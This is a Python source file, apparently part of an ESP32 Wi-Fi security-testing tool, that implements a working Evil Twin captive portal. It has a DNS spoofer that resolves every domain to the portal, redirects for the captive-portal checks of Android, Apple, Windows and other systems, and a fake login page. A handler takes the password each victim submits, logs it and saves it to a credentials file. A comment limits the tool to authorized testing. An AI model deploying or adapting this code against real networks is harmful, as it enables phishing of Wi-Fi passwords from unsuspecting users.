# captive_portal.py — HTTP server + DNS spoofer for Evil Twin captive portal
#
# Part of ESP32-S3 Marauder — Wi-Fi Security Testing Tool
#
# WARNING: This tool is intended for AUTHORIZED penetration testing and
# educational purposes ONLY.  Unauthorized use is illegal.

import socket
import struct
import time
import gc

from utils import log, log_error, get_storage_path, append_file, timestamp


# ---------------------------------------------------------------------------
# DNS Server — responds to ALL queries with the portal IP
# ---------------------------------------------------------------------------

class DNSServer:
    """Minimal UDP DNS server that resolves every query to the portal IP.

    This triggers captive-portal detection on Android, iOS, Windows, etc.
    """

    def __init__(self, portal_ip='192.168.4.1'):
        self.portal_ip = portal_ip
        self._sock = None
        # Pre-compute IP bytes
        self._ip_bytes = bytes(int(o) for o in portal_ip.split('.'))

    def start(self, port=53):
        """Bind UDP socket on port 53."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(('0.0.0.0', port))
        self._sock.setblocking(False)
        log('DNS server started on :%d -> %s' % (port, self.portal_ip))

    def poll(self):
        """Non-blocking: check for DNS query and respond."""
        if self._sock is None:
            return
        try:
            data, addr = self._sock.recvfrom(512)
            if data and len(data) > 12:
                resp = self._build_response(data)
                if resp:
                    self._sock.sendto(resp, addr)
        except OSError:
            pass  # No data available (non-blocking)

    def stop(self):
        """Close DNS socket."""
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

    def _build_response(self, query):
        """Build a DNS A-record response pointing to portal_ip.

        DNS wire format (simplified):
            Header:  ID(2) Flags(2) QDCount(2) ANCount(2) NSCount(2) ARCount(2)
            Question: QNAME(variable) QTYPE(2) QCLASS(2)
            Answer:   NAME(2, ptr) TYPE(2) CLASS(2) TTL(4) RDLENGTH(2) RDATA(4)
        """
        if len(query) < 12:
            return None

        # Transaction ID from query
        txn_id = query[:2]

        # Flags: Standard response, Recursion Available, No Error
        flags = b'\x81\x80'

        # Question count = 1, Answer count = 1, NS = 0, AR = 0
        counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'

        # Find the question section (starts at byte 12)
        # We need to skip the QNAME to find QTYPE/QCLASS
        pos = 12
        while pos < len(query) and query[pos] != 0:
            pos += query[pos] + 1
        pos += 1  # skip null terminator

        if pos + 4 > len(query):
            return None

        # Full question section (including QTYPE and QCLASS)
        question = query[12:pos + 4]

        # Answer section: pointer to name in question + A record
        answer = (
            b'\xc0\x0c'              # Name pointer to offset 12 (question name)
            b'\x00\x01'              # Type A
            b'\x00\x01'              # Class IN
            b'\x00\x00\x00\x3c'     # TTL = 60 seconds
            b'\x00\x04'              # RDLENGTH = 4
            + self._ip_bytes         # RDATA = IP address
        )

        return txn_id + flags + counts + question + answer


# ---------------------------------------------------------------------------
# Captive Portal HTTP Server
# ---------------------------------------------------------------------------

# Captive portal detection paths
CAPTIVE_DETECT_PATHS = (
    '/generate_204',        # Android
    '/gen_204',             # Android alt
    '/hotspot-detect.html', # Apple iOS/macOS
    '/library/test/success.html',  # Apple alt
    '/connecttest.txt',     # Windows
    '/ncsi.txt',            # Windows NCSI
    '/redirect',            # General
    '/success.txt',         # Firefox
    '/canonical.html',      # Firefox alt
    '/check_network_status.txt',  # Samsung
)

# Pre-built HTTP responses
HTTP_REDIRECT_TPL = (
    'HTTP/1.1 302 Found\r\n'
    'Location: http://{ip}/\r\n'
    'Content-Length: 0\r\n'
    'Connection: close\r\n\r\n'
)

HTTP_200_TPL = (
    'HTTP/1.1 200 OK\r\n'
    'Content-Type: {ct}\r\n'
    'Content-Length: {cl}\r\n'
    'Connection: close\r\n'
    'Cache-Control: no-cache\r\n\r\n'
)

SUCCESS_HTML = (
    '<html><head><meta http-equiv="refresh" content="10;url=/">'
    '<style>body{font-family:sans-serif;text-align:center;padding:60px;'
    'background:#f0f2f5}h2{color:#059669}p{color:#6b7280;margin-top:12px}</style>'
    '</head><body><h2>&#10003; Connecting...</h2>'
    '<p>Please wait while we connect you to the network.</p>'
    '<p style="font-size:12px;margin-top:30px;color:#9ca3af">'
    'If you are not redirected, <a href="/">click here</a>.</p>'
    '</body></html>'
)


class CaptivePortal:
    """HTTP server serving a fake Wi-Fi login page for Evil Twin attacks."""

    def __init__(self, ssid_name='WiFi'):
        self.ssid_name = ssid_name
        self.credentials = []  # list of {'password', 'client_ip', 'time'}
        self._http_sock = None
        self._dns = None
        self._running = False
        self._credential_cb = None
        self._portal_html = ''
        self._portal_ip = '192.168.4.1'

    def start(self, ip='192.168.4.1', http_port=80):
        """Start HTTP and DNS servers.

        Loads portal_page.html from the filesystem and injects the SSID.
        """
        self._portal_ip = ip

        # Load HTML template
        try:
            with open('portal_page.html', 'r') as f:
                self._portal_html = f.read()
        except OSError:
            # Fallback: try with path prefix
            try:
                with open('/portal_page.html', 'r') as f:
                    self._portal_html = f.read()
            except OSError:
                log_error('portal_page.html not found — using minimal page')
                self._portal_html = (
                    '<html><body><h1>{SSID_NAME}</h1>'
                    '<form action="/login" method="POST">'
                    '<input name="password" type="password" placeholder="Password">'
                    '<button type="submit">Connect</button>'
                    '</form></body></html>')

        # Inject SSID name
        self._portal_html = self._portal_html.replace('{SSID_NAME}', self.ssid_name)

        # Start DNS
        self._dns = DNSServer(portal_ip=ip)
        self._dns.start()

        # Start HTTP
        self._http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._http_sock.bind(('0.0.0.0', http_port))
        self._http_sock.listen(5)
        self._http_sock.setblocking(False)

        self._running = True
        log('Captive portal started on http://%s:%d' % (ip, http_port))

    def poll(self):
        """Non-blocking: handle one HTTP request + DNS poll.

        Call this repeatedly in the main loop.
        """
        if not self._running:
            return

        # DNS
        if self._dns:
            self._dns.poll()

        # HTTP
        if self._http_sock is None:
            return

        try:
            client_sock, client_addr = self._http_sock.accept()
        except OSError:
            return  # No pending connection

        try:
            client_sock.settimeout(2)
            self._handle_request(client_sock, client_addr)
        except Exception as e:
            log_error('HTTP handler error: %s' % str(e))
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    def stop(self):
        """Stop HTTP and DNS servers."""
        self._running = False
        if self._dns:
            self._dns.stop()
            self._dns = None
        if self._http_sock:
            try:
                self._http_sock.close()
            except Exception:
                pass
            self._http_sock = None
        log('Captive portal stopped')

    def on_credential(self, callback):
        """Register callback(password, client_ip) for captured credentials."""
        self._credential_cb = callback

    # ------------------------------------------------------------------
    # HTTP request handling
    # ------------------------------------------------------------------

    def _handle_request(self, sock, addr):
        """Parse HTTP request and route to appropriate handler."""
        try:
            raw = sock.recv(2048)
        except Exception:
            return

        if not raw:
            return

        request = raw.decode('utf-8', 'replace')
        lines = request.split('\r\n')
        if not lines:
            return

        # Parse request line
        parts = lines[0].split(' ')
        if len(parts) < 2:
            return

        method = parts[0].upper()
        path = parts[1].split('?')[0]  # strip query string

        # Extract body for POST
        body = ''
        if '\r\n\r\n' in request:
            body = request.split('\r\n\r\n', 1)[1]

        # Route
        if method == 'POST' and path == '/login':
            self._handle_login_post(sock, body, addr)
        elif path == '/':
            self._serve_login_page(sock)
        elif path in CAPTIVE_DETECT_PATHS:
            self._serve_redirect(sock)
        elif path == '/favicon.ico':
            self._send_response(sock, '204 No Content', 'text/plain', '')
        else:
            # Any unknown path → redirect to portal
            self._serve_redirect(sock)

    def _serve_login_page(self, sock):
        """Serve the HTML login page."""
        self._send_response(sock, '200 OK', 'text/html', self._portal_html)

    def _handle_login_post(self, sock, body, addr):
        """Extract password from POST, store, notify, respond."""
        password = ''

        # Parse URL-encoded body: password=xxx&...
        for pair in body.split('&'):
            if pair.startswith('password='):
                # URL-decode
                password = pair[9:]
                password = password.replace('+', ' ')
                password = self._url_decode(password)
                break

        if password:
            client_ip = addr[0] if addr else 'unknown'
            ts = timestamp()

            cred = {
                'password': password,
                'client_ip': client_ip,
                'time': ts,
            }
            self.credentials.append(cred)

            # Log prominently
            log('*** CREDENTIAL CAPTURED ***')
            log('  Password: %s' % password)
            log('  Client:   %s' % client_ip)
            log('  Time:     %s' % ts)

            # Save to file
            storage = get_storage_path()
            log_line = '%s | %s | %s\n' % (ts, client_ip, password)
            append_file('%s/captures/portals/credentials.txt' % storage,
                        log_line, mode='a')

            # Callback
            if self._credential_cb:
                try:
                    self._credential_cb(password, client_ip)
                except Exception:
                    pass

        # Serve success page
        self._send_response(sock, '200 OK', 'text/html', SUCCESS_HTML)

    def _serve_redirect(self, sock):
        """Send 302 redirect to the portal root."""
        resp = HTTP_REDIRECT_TPL.replace('{ip}', self._portal_ip)
        try:
            sock.send(resp.encode())
        except Exception:
            pass

    def _send_response(self, sock, status, content_type, body):
        """Send complete HTTP response."""
        if isinstance(body, str):
            body_bytes = body.encode('utf-8')
        else:
            body_bytes = body

        header = (
            'HTTP/1.1 %s\r\n'
            'Content-Type: %s; charset=utf-8\r\n'
            'Content-Length: %d\r\n'
            'Connection: close\r\n'
            'Cache-Control: no-cache, no-store\r\n'
            '\r\n' % (status, content_type, len(body_bytes))
        )

        try:
            sock.send(header.encode())
            # Send body in chunks to avoid memory issues
            chunk_size = 1024
            for i in range(0, len(body_bytes), chunk_size):
                sock.send(body_bytes[i:i + chunk_size])
        except Exception:
            pass

    @staticmethod
    def _url_decode(s):
        """Simple URL percent-decode."""
        result = []
        i = 0
        while i < len(s):
            if s[i] == '%' and i + 2 < len(s):
                try:
                    result.append(chr(int(s[i + 1:i + 3], 16)))
                    i += 3
                    continue
                except ValueError:
                    pass
            result.append(s[i])
            i += 1
        return ''.join(result)
